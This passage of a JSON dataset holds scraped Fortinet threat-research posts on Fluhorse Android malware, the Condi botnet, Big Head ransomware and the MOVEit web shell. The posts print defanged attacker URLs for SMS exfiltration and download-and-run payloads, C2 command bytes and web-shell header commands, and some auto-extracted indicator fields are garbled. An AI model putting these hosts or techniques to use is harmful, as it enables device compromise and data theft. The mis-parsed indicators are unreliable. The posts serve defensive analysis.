          "5ed057e99aed8356ccdf698f38fd3fe9ceabe517e1bd3245479fdd3cbb966fa9",
          "09bc7247b50a166996b667b9a6e696cfbafa203ffcbec46ad0cca27deacd5c25",
          "99f82c9a80fc6556f28e50e2889d59325e8169dc3742bf34121dc85207c6d965",
          "17205c43189c22dfcb278f5cc45c2562f622b0b6280dcd43cc1d3c274095eb90",
          "0595876dcfb02cbe4d85d3f9cb374b24473e5b338df781e18bd059ea48d60119",
          "4b83aaecddfcb8cf5caeff3cb30fee955ecfc3eea97d19dccf86f24c77c41fc4",
          "d408fe3421f520710e8a6ac6f0b9a1759b03ab3f44134e451d72af3bb79a3ad0",
          "f4f471241714fbf24a103f8a7fce00fecdf795dbf6edbc6420e34834cb93eb53",
          "d0f05cd6957e1e93d1ca4154762b4d4bcaeb16c0bf878b59a1500c4974ef4502",
          "e9fefd053b8c77c7db13d528b97d2b974dfd86775a8cc9c53b8efdb07db8842c",
          "6b7d80a4e6b7b6d2a74f135313473415ecbbd7382688d0b536a7df6a7ccb2bab",
          "83fc7095a91dc016bdbd965ae09182ea1d1a5b287cbfa4b0f3a58754336c8c33",
          "97a997a2a3b270a4db3b56fec30319bc0f41f069a5089c47f08e4c554bf3ac32",
          "a083060d38984e7c6f36dcd2c57ec1aa3f50f9c201c8538257c8cbf2b3217e96",
          "7ab838960858870eaf2701a737411c6a65e00077136d938f4ef736b3c949833d",
          "cce74c82a718be7484abf7c51011793f2717cfb2068c92aa35416a93cbd13cfa",
          "cf7fa7f54b06b09b750b8c50e4f8893e25ceaccfa9be8225f3279dc4e4ce0f4d"
        ],
        "cve": [
          "CVE-2021-34527",
          "CVE-2022-30190"
        ],
        "email": [],
        "url": [
          "https://en.wikipedia.org/wiki/ChaCha20",
          "https://www.cryptopp.com/"
        ]
      },
      "threat_score": 1.5432418436043502
    }
  },
  {
    "id": "Fortinet_60936",
    "source": "Fortinet",
    "title": "Fortinet Reverses Flutter-based Android Malware “Fluhorse”",
    "text": "FortiGuard Labs Threat Research Android/Fluhorseis a recently discovered malware family that emerged in May 2023. What sets this malware apart is its utilization of Flutter, an open-source SDK (software development kit) renowned among developers for its ability to build applications compatible with Android, iOS, Linux, and Windows platforms using a single codebase. While previous instances of threat actors using Flutter for malware exist, such asMoneyMonger, they actually used Flutter for its cross-platform UI elements without carrying the actual malicious payload. So, despite Flutter application reversing being notoriously difficult, MoneyMonger can actually be quite easily reversed with the usual Android reversing techniques. The Android/Fluhorse family represents a significant shift asit incorporates the malicious components directly within the Flutter code. This blog post covers insights on two notable aspects: 1. The Fluhorse campaign of May had basic obfuscation and no packing. In June, however, the sample we analyzed was packed. This is evidence that malware authors are moving to the next step of maturity. 2. Reverse engineering technique. Reversing Flutter applications is widely considered a challenging endeavor. Many researchers treat it as a black box, only analyzing those components that can be observed from the outside. Some employ dynamic instrumentation tools, like re-Flutter and re-flutter-demo, which come with their own complexities and risks associated with running malware in controlled environments. But for our analysis, we successfully managed tofully reverse-engineer the Fluhorse malware in a static manner, without the need for dynamic execution. Note that Fortinet customers are fully protectedagainst this family of malware. These samples are detected as Android/Fluhorse. A!tr.spy or Android/Packed.57103!tr, and all related URLs mentioned in this blog are detected and blocked. The malware we analyzed posed as a legitimate app for anelectronic toll systemused in Southern Asia. It lures the victim into entering his/her credentials, steals them, and also steals 2FA (two-factor authentication) codes by listening to incoming SMS and forwarding them to a website controlled by the attackers. Victims typicallyinstall the malware via e-mail phishing campaigns, with previous research claiming that Fluhorse has been downloaded over 100,000 times. The current version we analyzed (SHA256: 2c05efa757744cb01346fe6b39e9ef8ea2582d27481a441eb885c5c4dcd2b65b) was first seen on June 11, 2023. It is distributed from the malicious URL hxxps://fasd1[.]oss-ap-southeast-1.aliyuncs.com/ETC.apk. FortiGuard’s telemetry shows it has been being accessed from Asia since June 12. The sample is packed, concealing the encrypted payload within the wrapping application’s Dalvik executable, classes.dex. The packer adds a 4-byte integer at the end of the DEX that includes (1) the size of the encrypted payload and, just before that, (2) the encrypted payload. Decryption is performed at the native level(to harden reverse engineering) using OpenSSL’s EVP cryptographic API. The encryption algorithm is AES-128-CBC, and its implementation uses the same hard-coded string for the key and initialization vector (IV). From a cryptographic point of view, this is a bad idea as the IV is not meant to be confidential. The decrypted payload is a ZIP file that contains another DEX. The payload is then installed (the packer’s implementation includes Android sources for MultiDex support). The “main” of the malware is found in the payload (com.dsfdgfd.sdfsdf. MainActivity). It simply loads the Flutter application, as in the unpacked version of May 2023. Our in-depth static analysis of libapp.so revealed everything we needed to know, including the supposed directory structure of the malicious source code. The malicious Dart package is namedsms_fluterand has the following files: The malware uses the DartTelephonypackage. This package is non-malicious and its code is open-source anddocumented. In particular, the package offers the possibility oflistening to incoming SMS in the background. The malware author closely followed the documentation and created the following code (code is my manual re-construction from assembly). onBackgroundMessage(SmsMessage message) async {// malicious tasks}void main() {runApp(MyApp());} The corresponding assembly lines are shown below. For the reverse engineer, finding the address of a given Dart function is difficult. Several researchers usereFlutter, orsimilar techniqueswhere the application is instrumented and then run, causing each address to be dumped. Unfortunately, for malware analysts, this technique has two major drawbacks besides its complex setup: first, you only get the addresses of the functions you visit. Second,you instrument and run a malware, which should be avoided. To obtain the addresses I was looking for, I usedJEB, a reverse-engineering tool that offers some limited (but at least existing) support for Flutter. In particular, it finds the addresses of each referenced method and is usually able to correctly map the name in the assembly code. When it fails (more frequently on ARM32 and ARM64), I fall back to reversing the x86_64 library. Fortunately, the x86_64 version was provided in this Fluhorse sample, probably by error, because the rest of the implementation (for example, the packing) is not implemented for x86_64. If that doesn’t work, then I manually get the address from JEB’s code information and re-base it with the relocation base for zero-based objects. We can see below that the malware listens to incoming SMS. First, it registers for change notifications on SMS and then callslistenIncomingSmsin theTelephonypackage. The malware then posts the incoming SMS message to a remote website in an asynchronous task. Reverse engineering the code reveals several specificities to Dart assembly. In Dart, all constants, literals, etc, are stored in an Object Pool, which is like an index table. Later, all access to strings is done indirectly: the code asks for access to a given index. Dart assembly dedicates a custom registerR15for x86_64 to access the Object Pool. The illustrated example above accesses R15+8FB7, which corresponds to index 0x8FB7 // 8 =4598. JEB shows the Object Pool indexesfor us and lets us map the assembly line by fetching the domain name string. The SMS body is inserted in the URL as argument “c4” (e.g., hxxp://pmm122[.]com/addcontent?c4=hello). Theincoming phone number is not providedbecause the Telephony package does not provide this feature. In thefollowing code of the (non-malicious) Telephony package, see that only the SMS body is retrieved and provided to the callback. try {await handlerFunction(SmsMessage.fromMap(call.arguments['message'], INCOMING_SMS_COLUMNS));} catch (e) { Later, Fluhorse’s code performs the HTTP POST of the SMS message and reads the response. This is handled byDart’s standard HTTP package. Reversing Flutter applications statically is a breakthrough for anti-virus researchers, as, unfortunately, more malicious Flutter apps are expected to be released in the future. Building expertise in dealing with these samples and improving tools is necessary. This blog post provides results for Android/Fluhorse. More detailed explanations have been submitted to conferences in Q4 2023, where I hope to be selected to explain this live. ;) Stay tuned! Fortinet customers are fully protected against this family of malware. Samples in this blog are detected by the FortiGuard AV engine as: Android/Fluhorse. A!tr.spy Android/Packed.57103!tr. The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. Fortinet Webfiltering blocks all URLs identified in this blog. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. The samples mentioned in this blog post are (sha256 hash): 2c05efa757744cb01346fe6b39e9ef8ea2582d27481a441eb885c5c4dcd2b65b Other similar samples: e8cdf809a5655124fa9347e7a90f071bed74907d3098737fd1184148ab475e396e7293564e7e2e051d42168b068535a7963974cdd6437a3242230b9593dc7f047cee6677790c493dddf16ff610a174e6536208f8853816cd0d71fc6bde56e93c91f0a27ae5ca77930c21b19f33479e7abcb10dfcf2a92b690ccddea01434fe847dff0f7987f956c948847ea3659730408e35e4513b6adcd92d60ba48a93f62f16f0b3733f91a6af56bf5bc789b808475cb556f2d360131ef6a9082b98dfd01390a577ee60ca676e49add6f266a1ee8ba5434290fa8954cc35f8754604600838825fee29a8cb3e6b71771897e34a58cf9c7c0be4805acabb36be886e93de03f62663033dce1688186d6111c8637dd3bc79483bdb8fc1b2ad4d5ead030f79f84b76dbde61a3aa372e8af7aa049dd466a2892bbe0d1229866cb2ba46c8f61648a5794bb98d9955947f9e7c502961e4b2a7724289e80b566035c14ac9fa6cf36df1c852314984cbea056a782520654f84c828588b6a0163bdeb8f8d5016b05c205f9c55feac16e7ca084f47a899281b566faf41b5666376353efeb9010fe5d23b5260a106c851a267fb8590be1f033e995bfc559ffaf2be050b3f12f599e0c8c021c32c427581a0368b66dd50b381772fb0d6dab30d8316f4e4f0d0373d453091cd07909593a310b245a1a92a78469be341b0849e6f1076af30f8266b1c5a861ead1c25d533487499204771fac87787d38df91f0971b693dffa9b17fa0d92c80bfac5af2ec81d09ecbf8c26a8887d96c948b3c61667b7ffc488fbd67239ea9ac2cd65481348e4751a494bc76ab4908071124f12624369401b717c7766e7d0645754d android malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/fortinet-reverses-flutter-based-android-malware-fluhorse",
      "scraped_at": "2025-07-20T13:56:00.468194",
      "indicators": {
        "ip_address": [],
        "domain": [
          "msMessage",
          "lasses",
          "ss-ap-southeast-1",
          "r",
          "ibapp",
          "om",
          "TC",
          "all"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "2c05efa757744cb01346fe6b39e9ef8ea2582d27481a441eb885c5c4dcd2b65b"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.3445378151260505
    }
  },
  {
    "id": "Fortinet_41311",
    "source": "Fortinet",
    "title": "Condi DDoS Botnet Spreads via TP-Link's CVE-2023-1389",
    "text": "FortiGuard Labs Threat Research Affected platforms:LinuxImpacted parties:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity level:Critical FortiGuard Labs encountered recent samples of aDDoS-as-a-service botnet calling itself Condi. It attempted to spread by exploiting TP-Link Archer AX21 (AX1800) routers vulnerable toCVE-2023-1389, which was disclosed in mid-March of this year. We have additionally observed an increasing number of Condi samples collected from our monitoring systems since the end of May 2023, indicating an active attempt to expand the botnet. This blog details the capabilities of this botnet. While pivoting from the Command and Control (C2) domain cdn2[.]duc3k[.]com in one of the malware samples, FortiGuard Labs researchers found a sibling domain admin[.]duc3k[.]com that previously displayed the message \"contact @zxcr9999 telegram”. A quick search revealed a Telegram channel, Condi Network, advertising a Condi botnet with capabilities matching those observed in our sample (Figure 1). The Telegram channel was started in May 2022, and the threat actor has been monetizing its botnet by providing DDoS-as-a-service and selling the malware source code (Figure 2). We provide a technical analysis of the ARM malware sample509f5bb6bcc0f2da762847364f7c433d1179fb2b2f4828eefb30828c485a3084in the following sections: This malware employs several techniques to keep itself running in an infected system. At the same time, it also prevents infections from other botnets by attempting to terminate their processes. Typical to Mirai-based botnets, this malware cannot survive a system reboot. Because of this, it deletes the following binaries used to shut down or reboot the system. It also reads the /proc/<PID>/status for each running process and compares the Name field to the following strings to kill any processes with matching names: We assess that the developer intended to kill off older versions of Condi currently running on an infected device together with selected system processes. However, the implementation is flawed as the Name field only contains the executable names of processes and not their full paths. Additionally, it kills any processes with binary filenames containing the following extensions commonly used by other botnets: It also generates a random string of at least ten characters from the custom alphanumeric character set \"lvrvup9w0zwi6nuqf0kilumln8ox5vgv@\" and attempts to kill any process with this string in its command line, however it is near certain this process will not exist. Which process the malware developer intended to terminate with this code is unclear. Finally, it generates two numbers (one between 12 and 32, the other between 12 and 20) and kills any processes with a command line length matching either number. Killing off random processes based on their command line length is likely to wreak havoc and prevent the infected device from functioning correctly if the malware happens to terminate system processes. Unlike most DDoS botnets, this sample does not propagate by trying different credentials. Instead, it embeds a simple scanner modified from Mirai’s original Telnet scanner to scan for any public IPs with open ports 80 or 8080 (commonly used for HTTP servers) and then sends a hardcoded exploitation request (Figure 3) to download and execute a remote shell script at hxxp://cdn2[.]duc3k[.]com/t, which will infect the device with Condi if it is a vulnerable TP-Link Archer AX21 device. The remote shell script is typical of Mirai-based loaders that try to download and execute binaries of each architecture in turn (Figure 4). The first command-line argument provided to the malware binary, ”0days”, in this case, is referred to as “id” (“source” in the original Mirai code), which DDoS botnet operators commonly use to identify the method used to replicate the malware. While the sample we analyzed only contained the scanner for CVE-2023-1389, other Condi botnet samples were also seen exploiting other vulnerabilities to propagate. The publicly available source code for older versions also includes scanners for known vulnerabilities exploited by other Mirai variants. We also observed shell scripts hosted on the same IP with different sources in the execution commands. Figure 5 shows a script with an “adb” source, which refers to Android Debug Bridge (ADB). We found source code for an older version of Condi that scans for devices withan open Android Debug Bridge port(TCP/5555), so it is possible that the botnet is currently being propagated via this means. The binary protocol used by Condi to communicate with the C2 server is a modified version of that initially implemented in Mirai. The initial registration packet sent by the bot to the C2 contains the bytes\\x33\\x66\\x99, commonly associated with Moobot, another Mirai variant. These bytes are followed by a one-byte length of the “id”. In the case of Condi, \"id” defaults to “c” if none was specified, or in our case, of an infection via CVE-2023-1389, “0days”. This signals the C2 server that the malware is ready to receive commands. The first three bytes of the C2 response indicate the command for the Condi bot: 1.\\x99\\x66\\x33: Likely to check if the malware is still active, in which case the malware sends a packet to C2 with \\x66\\x99\\x66\\x04 followed by “ping” 2.\\x99\\x66\\x66: Terminate the bot 3.\\x33\\x66\\x66: Start the webserver for serving malware binaries 4.\\x33\\x66\\x33: Update binaries served by the webserver 5.\\x33\\x66\\x99: Send the webserver port. Malware responds with \\x66\\x99\\x66 followed by a length of the next string and “CondiiNeett webserv:<PORT>\" 6.\\x66\\x66\\x99: Sets an unusedlockdownflag, which might indicate a feature in development. Once it receives the\\x33\\x66\\x66command used to start the webserver, this malware downloads bot binaries from a hardcoded IP and port. After that, it starts a basic HTTP server on a random port number above 1024 to host these binaries. GET, POST, and HEAD requests to this server for the/arm,/arm7,/mips,/mipsel,/x86_64,/sh4,/ppc, and/m68kURLs will serve these binaries if they were downloaded previously. This HTTP server masquerades as a legitimate Apache HTTP server by responding with the “Server: Apache” header when any URLs are requested. From then on, the threat actor can issue the\\x33\\x66\\x33command to download the latest binaries from the same hardcoded IP and port so that the webserver serves the most updated version of the malware. If the first byte of the C2 response is not\\x33,\\x66, or\\x99, the bot parses it as an attack command in the same way as Mirai. Below is this sample's list of attack functions and a description of the implemented attack method. As the attack methods are consistent with the descriptions in the Telegram advertisement (Figure 1), this particular sample was likely built by the bot developer or someone with access to the malware source code. This sample did not contain any HTTP attack methods observed in older Condi versions. Malware campaigns, especially botnets, are always looking for ways to expand. Exploiting recently discovered (or published) vulnerabilities has always been one of their favored methods, as we highlighted above for the Condi botnet. Thus, it is strongly recommended to always apply the latest security patches and updates as soon as possible. As always, FortiGuard Labs will continue to monitor these campaigns. Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiClient, and FortiEDR services, as follows: The following (AV) signature detects the malware samples mentioned in this blog: The FortiGuard AntiVirus service is supported by FortiGate, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. The FortiGuard Web Filtering Service blocks the C2 servers and download URLs. FortiGuard Labs provides IPS signatures against attacks exploiting the following vulnerability: For a comprehensive list of protections from FortiGuard Labs for this vulnerability, please visit theOutbreak Alertpage for further details. TheFortiGuard IP Reputation and Anti-Botnet Security Serviceproactively blocks these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 091d1aca4fcd399102610265a57f5a6016f06b1947f86382a2bf2a668912554f291e6383284d38f958fb90d56780536b03bcc321f1177713d3834495f64a3144449ad6e25b703b85fb0849a234cbb62770653e6518cf1584a94a52cca31b11904e3fa5fa2dcc6328c71fed84c9d18dfdbd34f8688c6bee1526fd22ee1d749e5a509f5bb6bcc0f2da762847364f7c433d1179fb2b2f4828eefb30828c485a3084593e75b5809591469dbf57a7f76f93cb256471d89267c3800f855cabefe493155e841db73f5faefe97e38c131433689cb2df6f024466081f26c07c4901fdf612cbff9c7b5eea051188cfd0c47bd7f5fe51983fba0b237f400522f22ab91d2772ccda8a68a412eb1bc468e82dda12eb9a7c9d186fabf0bbdc3f24cd0fb20458cce7a4aae413d4742d9c0e25066997153b844789a1409fd0aecce8cc6868729a15f7fb5f3dc06aebcb56f7a9550b005c2c4fc6b2e2a50430d64389914f882d67cf hxxp://85[.]217[.]144[.]35/armhxxp://85[.]217[.]144[.]35/arm5hxxp://85[.]217[.]144[.]35/arm6hxxp://85[.]217[.]144[.]35/arm7hxxp://85[.]217[.]144[.]35/m68khxxp://85[.]217[.]144[.]35/mipshxxp://85[.]217[.]144[.]35/mpslhxxp://85[.]217[.]144[.]35/ppchxxp://85[.]217[.]144[.]35/sh4hxxp://85[.]217[.]144[.]35/x86hxxp://85[.]217[.]144[.]35/x86_64hxxp://85[.]217[.]144[.]35/abc3.shhxxp://cdn2[.]duc3k[.]com/t 85[.]217[.]144[.]35cdn2[.]duc3k[.]com botnet,DDoS attacks FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/condi-ddos-botnet-spreads-via-tp-links-cve-2023-1389",
      "scraped_at": "2025-07-20T13:56:07.314905",
      "indicators": {
        "ip_address": [],
        "domain": [
          "bc3"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [
          "CVE-2023-1389"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.4652936689549963
    }
  },
  {
    "id": "Fortinet_160",
    "source": "Fortinet",
    "title": "Ransomware Roundup - Big Head",
    "text": "FortiGuard Labs Threat Research FortiGuard Labs came across two new ransomware variants, “Big Head” and another likely used by the same attacker, targeting consumers to extort money. On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Big Head ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High FortiGuard Labs recently came across a new ransomware variant called Big Head, which came out in May 2023. Although there are at least three variants of Big Head ransomware, all are designed to encrypt files on victims’ machines to extort money, like other ransomware variants. One Big Head ransomware variant displays a fake Windows Update, potentially indicating that the ransomware was also distributed as a fake Windows Update. One of the variants has a Microsoft Word icon and was likely distributed as counterfeit software. At the time of this research, there is no indication that Big Head is widespread. FortiGuard Labs is aware of at least two variants of Big Head ransomware, which we have named variants A and B. Once Big Head ransomware variant A is executed, it displays a fake Windows Update screen to trick users into believing that legitimate actions are occurring behind the scenes. The fake Windows Update lasts about 30 seconds and automatically closes. By the time the phony update is done, the ransomware has already encrypted files on compromised machines with file names randomly altered. The ransomware then opens a ransom note labeled “README_[random seven digits number] that demands victims contact the attacker via email or telegram for file decryption and data leak. Big Head ransomware variant A has also been seen to leave a slightly different version of the ransom note, including the attacker’s Bitcoin address for “immediate ransom payment.” While the Big Head ransomware variant B did not encrypt any files in our test environment, it is designed to encrypt files on compromised machines. Our analysis found that variant B uses a PowerShell file named “cry.ps1” for file encryption. The variant B does not drop cry.ps1 in some cases, and file encryption does not occur. However, it does not stop variant B from replacing the Desktop wallpaper with its own containing ransom note. Like variant A, the ransom note requests that victims contact the attacker using the same email address or telegram channel. The difference is that a ransom fee of one Bitcoin is included in the variant B ransom note. The relatively low ransom fee indicates that Big Head ransomware is used to target consumers rather than enterprises. Variant B separately drops a ransom note labeled “Read Me First!/txt” with the same ransom message as the wallpaper. Variant B also tries to open the attacker’s Github page on a default Web browser; however, the page is unavailable because it has been removed or shut down. The attacker’s Bitcoin wallet recorded two transactions: one in December 2022 for $313.93, the other in August of the same year for $70.07. Since the Big Head ransomware came out in May 2023, those transactions do not appear to be related to the ransomware variant. Ransomware of the Same Stripe FortiGuard Labs found another ransomware variant that, based on the Bitcoin wallet and email address, was likely used by the same attacker. This ransomware was also submitted to a publicly available file scanning service in May 2023, the same month the Big Head ransomware variants were made available. This ransomware variant encrypts files and appends the attacker’s contact email address, “poop69new@[redacted],” to the file names. It also replaces the desktop wallpaper with its own that includes the following ransom note. It also leaves an alternative ransom note labeled “read_it.txt”. Most of the Big Head ransomware samples were submitted from the United States. Another ransomware used by the same attacker was submitted from the United States, Spain, France, and Turkey. Fortinet customers are already protected from this malware variant through AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Big Head ransomware variants with the following AV signatures: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. File-based IOCs: 2a36d1be9330a77f0bc0f7fdc0e903ddd99fcee0b9c93cb69d2f0773f0afd254 Big Head ransomware 39caec2f2e9fda6e6a7ce8f22e29e1c77c8f1b4bde80c91f6f78cc819f031756 40e5050b894cb70c93260645bf9804f50580050eb131e24f30cb91eec9ad1a6e 64246b9455d76a094376b04a2584d16771cd6164db72287492078719a0c749ab 6d27c1b457a34ce9edfb4060d9e04eb44d021a7b03223ee72ca569c8c4215438 9c1c527a826d16419009a1b7797ed20990b9a04344da9c32deea00378a6eeee2 ae927feae84239c7f56a2c49aadb02dc318ef4be2860353b6a2428bdbbf0ae71 bcf8464d042171d7ecaada848b5403b6a810a91f7fd8f298b611e94fa7250463 dcfa0fca8c1dd710b4f40784d286c39e5d07b87700bdc87a48659c0426ec6cb6 1942aac761bc2e21cf303e987ef2a7740a33c388af28ba57787f10b1804ea38e Another ransomware used by the same attacker f59c45b71eb62326d74e83a87f821603bf277465863bfc9c1dcb38a97b0b359d Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is generally delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU. S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. Ransomware Roundup,ransomware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/fortiguard-labs-ransomware-roundup-big-head",
      "scraped_at": "2025-07-20T13:56:15.309817",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "ae927feae84239c7f56a2c49aadb02dc318ef4be2860353b6a2428bdbbf0ae71",
          "2a36d1be9330a77f0bc0f7fdc0e903ddd99fcee0b9c93cb69d2f0773f0afd254",
          "dcfa0fca8c1dd710b4f40784d286c39e5d07b87700bdc87a48659c0426ec6cb6",
          "39caec2f2e9fda6e6a7ce8f22e29e1c77c8f1b4bde80c91f6f78cc819f031756",
          "9c1c527a826d16419009a1b7797ed20990b9a04344da9c32deea00378a6eeee2",
          "1942aac761bc2e21cf303e987ef2a7740a33c388af28ba57787f10b1804ea38e",
          "6d27c1b457a34ce9edfb4060d9e04eb44d021a7b03223ee72ca569c8c4215438",
          "f59c45b71eb62326d74e83a87f821603bf277465863bfc9c1dcb38a97b0b359d",
          "bcf8464d042171d7ecaada848b5403b6a810a91f7fd8f298b611e94fa7250463",
          "64246b9455d76a094376b04a2584d16771cd6164db72287492078719a0c749ab",
          "40e5050b894cb70c93260645bf9804f50580050eb131e24f30cb91eec9ad1a6e"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.6916192026037429
    }
  },
  {
    "id": "Fortinet_51816",
    "source": "Fortinet",
    "title": "MOVEit Transfer Critical Vulnerability (CVE-2023-34362) Exploited as a 0-day",
    "text": "FortiGuard Labs Threat Research Affected Platforms:All unpatched MOVEit Transfer versions running a SQL databaseImpacted Users:Any organization that uses a vulnerable version of MOVEit TransferImpact:Remote attackers can install a backdoor and exfiltrate dataSeverity Level:High FortiGuard Labs is aware of a critical zero-day SQL injection vulnerability in the MOVEit Secure Managed File Transfer software (CVE-2023-34362) allegedly exploited by the Cl0p ransomware threat actor. High-profile government, finance, media, aviation, and healthcare organizations have reportedly been affected, with data exfiltrated and stolen. Due to its severity, CISA released anadvisoryfor the vulnerability on June 1st, 2023. They also updated theKnown Exploited Vulnerabilitiescatalog on June 2ndwith CVE-2023-34362. This blog contains information on what you need to know about CVE-2023-34362. For further details, please see the relatedFortiGuard Labs Outbreak Alert. MOVEit Transfer is a commercial secure managed file transfer (MFT) software solution that enables the secure movement of files between organizations and their customers using SFTP, SCP, and HTTP-based uploads. MOVEit Transfer is vulnerable to a SQL injection vulnerability that could allow an unauthenticated attacker to access MOVEit Transfer's database. Structured Query Language (SQL) allows queries and commands to be executed against a relational database. An injection vulnerability allows an attacker to manipulate one of these queries to exploit a system to retrieve data or make changes. In this case, an attacker could pull data from the database that would otherwise be secured, execute their own SQL queries, and change and delete data. This vulnerability affects versions of MOVEit before 2021.0.6 (13.0.6), 2021.1.4 (13.1.4), 2022.0.4 (14.0.4), 2022.1.5 (14.1.5), and 2023.0.1 (15.0.1) as well as versions using the following engines to host the actual database: MySQL [open-source relational database management system], Microsoft SQL Server [Microsoft on-premises relational database management system], and Azure SQL [Microsoft cloud-based relational database management system]). Reportedly, a web shell that acts as a backdoor was deployed, and data exfiltration was performed after successfully exploiting the vulnerability. However, as described in the next section, attackers can deploy any file after exploitation. At the time of this writing, a CVSS score still needs to be assigned for the vulnerability. Our investigation on a web shell backdoor likely installed after CVE-2023-34362 was successfully exploited revealed that all commands to the backdoor are sent through extra HTTP request headers. A password is needed to verify the attacker and allow access to the backdoor. This is sent with the \"X-siLock-Comment\" header. If the password is invalid, the backdoor will respond with a 404 HTTP status code to pretend the backdoor doesn't exist. We also discovered that the web shell has the following attack flows: 1. Delete the service account. The HTTP request headers should include the following: If \"-2\" is sent with an \"X-siLock-Step1\" header, the backdoor deletes any users from the \"user\" table in the database that has the actual name of \"Health Check Service.\" 2. List database files. The HTTP request headers should include the following: If \"-1\" is sent with an \"X-siLock-Step1\" header, the backdoor list files in the database. The file listing also includes file metadata. It tries to include the file's id, name, and size. It also tries to display the file's location (folder path) and which user owns/uploaded the file. The listing also tries to include which institution the file is associated with. 3. Create a new service account. The HTTP request headers should include the following: If an integer is sent with an \"X-siLock-Step1\" header, and it isn't \"-1\" or \"-2\", the backdoor assumes it is an institution id. Institution ids can be enumerated from step 2 in the attack flow when the database files are listed. The attacker is trying to create a new service account for a specific institution. To ensure step 1 in the attack flow was successful, this command first looks for users with an active session and a permission level of \"30\" belonging to the institution. If no account with the real name of “Health Check Service” exists, the backdoor creates a new username containing 16 random alphanumeric characters. It inserts that as the new Health Check Service account for the specified institution. It then tries to add that to the list of currently active sessions using the IP address 127.0.0.1 since the service account is supposed to be local. 4. Download arbitrary files. The HTTP request headers should include the following: If an institution id, folder id, and file id are all included, it attempts to download the file. These values can be obtained from step 2 in the overall attack flow. While we do not know precisely how many organizations were impacted by this vulnerability, publicly available information indicates that several high-profile organizations have been compromised. The web shell backdoor, likely deployed due to the successful exploitation of CVE-2023-34362, was submitted to a public file scanning service from the United States, the United Kingdom, Germany, Italy, India, and Pakistan. As such, potential victims could likely be located in those countries. The vendor released an advisory on May 31st, 2023, along with the timeline: The advisory contains Indicators of Compromise (IOCs) that can help cybersecurity professionals identify attacks leveraging CVE-2023-34462. Yes. A vendor patch was released on May 31st, 2023. FortiGuard Labs has the following AV signature available for the available web shell backdoor samples reportedly deployed after CVE-2023-34362 was exploited: FortiGuard Labs released the following IPS signature for CVE-2023-34362 in version 23.570: Webfiltering blocks Network IOCs listed on the security advisory issued by Progress. For a comprehensive list of protections from FortiGuard Labs, please visit theOutbreak Alert pagefor 